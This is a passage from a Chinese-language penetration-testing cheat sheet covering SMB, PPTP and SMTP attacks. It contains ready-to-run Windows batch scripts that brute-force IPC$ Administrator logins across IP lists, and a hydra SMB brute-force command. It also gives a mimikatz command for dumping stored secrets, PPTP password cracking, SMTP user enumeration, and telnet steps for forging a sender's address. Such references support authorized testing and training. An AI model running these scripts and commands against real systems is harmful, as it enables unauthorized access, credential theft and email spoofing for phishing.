    ```
- enum
    ```bash
    enum -s 
    enum -U 
    enum -P 
    ```
- enum4linux
    ```bash
    enum4linux -a 
    ```
**匿名共享**
- smbclient
    ```bash
    smbclient //$ip/share -U username
    smbclient \\\\\\
    smbclient ///
    smbclient ///
    smbclient ///
    ```
- rpcclient
    ```bash
    rpcclient -U " " 
    rpcclient -U " " -N 
    ```
**暴力破解**
可以暴力破解来获得目标主机的 smb 访问。
```bash
hydra -L user.txt -P pass.txt 192.168.1.1 smb
```
- IPC 爆破
    ```
    ip.txt 放入要爆破的 IP
    pass.txt 放入爆破的密码
    默认爆破用户：Administrator
    爆破成功的结果，会在 bat 运行的当前目录生成 out.txt
    爆破进度的查询：type log.txt，完成后当前目录生成 end.txt
    ```
    非空连接爆破.bat
    ```bat
    @echo off
    cls
    echo Useage: %0 ip.txt pass.txt
    for /f %%t in (%1) do (
    FOR /F "eol=; tokens=1,2,3* delims=, " %%i in (%2) do (
    echo net use \\%%t\ipc$ "%%i" /user:"localhost\Administrator" >> log.txt
    net use \\%%t\ipc$ "%%i" /user:"localhost\Administrator"  >NUL 2>NUL
    IF NOT errorlevel 1 (
    echo %%i  t:%%t>> out.txt
    net use \\%%t\ipc$ /del
    )
    net use * /del /y >NUL 2>NUL
    )
    )
    echo end >> end.txt
    ```
    空连接爆破.bat
    ```bat
    @echo off
    cls
    echo Useage: %0 ip.txt
    for /f %%t in (%1) do (
    echo net use \\%%t\ipc$ "" /user:"localhost\Administrator" >> log.txt
    net use \\%%t\ipc$ "" /user:"localhost\Administrator"  >NUL 2>NUL
    IF NOT errorlevel 1 (
    echo success:%%t>> out.txt
    net use \\%%t\ipc$ /del
    )
    net use * /del /y >NUL 2>NUL
    )
    echo end >> end.txt
    ```
**利用 NTLM 值破解 SMB**
主要依靠钓鱼,不是很适合在实战中使用,内容见 https://www.hackingarticles.in/4-ways-capture-ntlm-hashes-network/
---
## PPTP
**相关文章**
- [渗透技巧——PPTP口令的获取与爆破](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-PPTP%E5%8F%A3%E4%BB%A4%E7%9A%84%E8%8E%B7%E5%8F%96%E4%B8%8E%E7%88%86%E7%A0%B4/)
**获得PPTP 口令**
Windows系统拨号和宽带连接的配置信息存储在固定位置，路径如下： `%APPDATA%\Microsoft\Network\Connections\Pbk\rasphone.pbk` 查看该文件即可获得 PPTP 连接的配置信息，包括服务器 IP，不包含连接用户名和口令
```
mimikatz.exe privilege::debug token::elevate lsadump::secrets exit
```
**windows 命令行下连接 PPTP VPN**
```
rasdial "VPN Connection" username pass
# 关闭连接
rasphone -h "VPN Connection"
```
**kali 连接 PPTP VPN**
```bash
pptpsetup --create vpn --server xx.xx.xx.xx --username username --password pass --encrypt --start
# 将默认路由表修改为远程
route del default
route add default gw xx.xx.xx.xx
```
**暴力破解 PPTP 口令**
- 相关工具
    - [BlackArch/thc-pptp-bruter](https://github.com/BlackArch/thc-pptp-bruter) - kali 默认自带
        ```
        cat wordlist | thc-pptp-bruter -u username xx.xx.xx.xxx
        ```
    - [pptp_password_hack.py](https://github.com/3gstudent/Homework-of-Python/blob/master/pptp_password_hack.py)
---
## SMTP
**描述**
SMTP 为邮件协讫,默认端口 25.经常用来邮箱伪造,钓鱼攻击.
**相关文章**
- [SMTP 协议 25 端口渗透测试记录](https://www.sqlsec.com/2017/08/smtp.html)
**相关工具**
- [Rvn0xsy/SMTP-NC](https://github.com/Rvn0xsy/SMTP-NC) - SMTP Netcat , test SMTP protocol
**邮件检测**
- SPF : http://spf.myisp.ch/
- MX : https://toolbox.googleapps.com/apps/checkmx
- DMARC : https://www.agari.com/insights/tools/DMARC
**枚举用户**
- [SMTP 用户枚举原理简介及相关工具](https://www.freebuf.com/articles/web/182746.html)
```
MAIL FROM   : 指定发件人地址
RCPT TO : 指定单个的邮件接收人;可有多个 RCPT TO;常在 MAIL FROM命令之后
VRFY    : 用于验证指定的用户/邮箱是否存在;由于安全原因,服务器常禁止此命令
EXPN    : 验证给定的邮箱列表是否存在,也常被禁用
```
```
SMTP 返回码
500 	格式错误,命令不可识别(此错误也包括命令行过长)
501 	参数格式错误
502 	命令不可实现
503 	错误的命令序列
504 	命令参数不可实现
211 	系统状态或系统帮助响应
214 	帮助信息
220 	服务就绪
221 	服务关闭传输信道
421 	服务未就绪,关闭传输信道(当必须关闭时,此应答可以作为对任何命令的响应)
250 	要求的邮件操作完成
251 	用户非本地,将转发向
450 	要求的邮件操作未完成,邮箱不可用(例如,邮箱忙)
550 	要求的邮件操作未完成,邮箱不可用(例如,邮箱未找到,或不可访问)
451 	放弃要求的操作;处理过程中出错
551 	用户非本地,请尝试
452 	系统存储不足,要求的操作未执行
552 	过量的存储分配,要求的操作未执行
553 	邮箱名不可用,要求的操作未执行(例如邮箱格式错误)
354 	开始邮件输入,以.结束
554 	操作失败
535 	用户验证失败
235 	用户验证成功
334 	等待用户输入验证信息
```
可以通过 Telnet 连接,在未禁用上述 SMTP 命令的服务器上,使用上述命令手动枚举用户名.
```
$ telnet xxx.xxx.xxx.xxx 25
Trying xxx.xxx.xxx.xxx...
Connected to xxx.xxx.xxx.xxx.
Escape character is '^]'.
220 mxt.xxx.xxx.cn ESMTP Postfix
VRFY root
252 2.0.0 root
VRFY bin
252 2.0.0 bin
VRFY admin
550 5.1.1 : Recipient address rejected: User unknown in local recipient table
$ telnet xxx.xxx.xxx.xxx 25
Trying xxx.xxx.xxx.xxx...
Connected to xxx.xxx.xxx.xxx.
Escape character is '^]'.
220 mxt.xxx.xxx.cn ESMTP Postfix
MAIL FROM:root
250 2.1.0 Ok
RCPT TO:root
250 2.1.5 Ok
RCPT TO:bin
250 2.1.5 Ok
RCPT TO:admin
550 5.1.1 : Recipient address rejected: User unknown in local recipient table
```
可以看到两种方式均返回 root、bin 用户是存在的,admin 用户不存在.
- smtp-user-enum - kali 自带
    ```bash
    smtp-user-enum -M VRFY -u root -t xxx.xxx.xxx.xxx
    smtp-user-enum -M RCPT -u bin -t xxx.xxx.xxx.xxx
    smtp-user-enum -M EXPN -u bin -t xxx.xxx.xxx.xxx
    ```
- MSF 模块
    ```bash
    use auxiliary/scanner/smtp/smtp_enum
    set rhosts xxx.xxx.xxx.xxx
    run
    ```
- smtp-enum-users - nmap 脚本
    ```bash
    nmap -p 25 --script smtp-enum-users.nse xxx.xxx.xxx.xxx
    ```
**邮件伪造**
- 相关文章
    - [关于伪造邮件的简单研究](https://hex.moe/p/4878b295/)
- SPF邮件伪造
    SPF 是 Sender PolicyFramework 的缩写，一种以 IP 地址认证电子邮件发件人身份的技术。接收邮件方会首先检查域名的 SPF 记录，来确定发件人的 IP 地址是否被包含在 SPF 记录里面，如果在，就认为是一封正确的邮件，否则会认为是一封伪造的邮件进行退回。SPF 可以防止别人伪造你来发邮件，是为了防范垃圾邮件而提出来的一种 DNS 记录，它是一种 TXT 类型的记录。
    由于 SMTP 邮件服务商互相发送邮件是不需要认证的，邮件伪造也是利用这个特性来实现伪造任意发件人。
- 简单方法
    ```
    telnet xxx.xxx.xxx.xxx 25
    HELO xxxx.com   # 向邮件服务器提供连接的域名,也就是邮件将从哪台服务器发来.
    MAIL FROM:PI:EMAIL  # 伪造管理员身份来发邮件
    RCPT TO:PI:EMAIL # 验证邮件地址是否存在.如果查询的是一个真实的 Email 地址,邮件服务器就会返回250状态码.验证邮箱存在的话,还可以给这个接受者邮箱发送邮件.
    DATA    # 使用DATA命令来伪造邮箱内容,客户端告诉服务器自己准备发送邮件正文
    354 go ahead, end data with CRLF.CRLF   # 服务器返回354,表示自己已经作好接受邮件的准备
    "这是一个邮件伪造测试"  # 用英文状态的双引号来修饰正文,正文结束后,发送结束符.表明正文的结束.
    .
    QUIT
    ```